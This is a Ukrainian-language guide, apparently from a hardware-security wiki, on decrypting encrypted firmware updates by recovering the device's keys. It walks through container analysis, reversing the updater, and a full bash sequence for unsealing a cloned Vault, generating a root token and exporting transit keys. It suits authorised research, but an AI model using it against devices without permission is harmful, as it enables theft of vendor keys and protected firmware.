Якщо образ оновлення містить невеликі метадані у відкритому вигляді та великий високoентропійний блок, спершу проаналізуйте контейнер, а не намагайтеся щось перебирати:<sup>[[1]](#references)</sup>

- Виведіть заголовки, зсуви та межі рядків за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` і `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 байтів — це salt, а решта байтів — шифротекст.
- Поле Base64, яке після декодування має рівно `256` байтів, переконливо свідчить, що перед вами шифротекст RSA-2048, який містить випадковий пароль firmware/ключ сеансу.
- Відокремлені дані PGP у тому самому файлі часто захищають лише автентичність; не вважайте їх механізмом забезпечення конфіденційності.

Якщо пошук ключів у статичних даних (`grep`, `strings`, пошук PEM/PGP) нічого не дав, реверс-інжинірте **операційний шлях розшифрування**, а не обмежуйтеся пошуком приватних ключів:

- Декомпілюйте updater / бінарний файл керування та простежте, хто читає зашифрований блок, який helper/API його розшифровує і яке логічне ім’я ключа він запитує.
- Шукайте у витягнутій кореневій файловій системі стан KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також unit-файли та init-скрипти.
- Вважайте команди `vault operator unseal ...` у відкритому вигляді, ключі відновлення, bootstrap-токени або локальні скрипти автоматичного unseal KMS еквівалентом матеріалу приватного ключа.

Якщо в пристрої є оригінальний бінарний файл Vault і backend сховища, зазвичай простіше відтворити це середовище, ніж повторно реалізовувати внутрішню логіку Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

З root-доступом до клонованого KMS:

- Зробіть transit keys експортованими лише в ізольованому клоні: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте ключ unwrap: `vault read transit/export/encryption-key/<name>`
- Спробуйте використати відновлений RSA-ключ із точною парою padding/hash, яку використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала розшифровка OAEP за замовчуванням **не** доводять, що ключ неправильний: у багатьох потоках на базі Vault використовується OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL від виробника (`EVP_BytesToKey`, на застарілих пристроях часто MD5), перш ніж пробувати розшифрувати AES-CBC.

Це перетворює проблему «зашифрованої прошивки» на ширше завдання: **відновити операційні ключі на стороні пристрою, а потім точно відтворити параметри unwrap + KDF офлайн**.
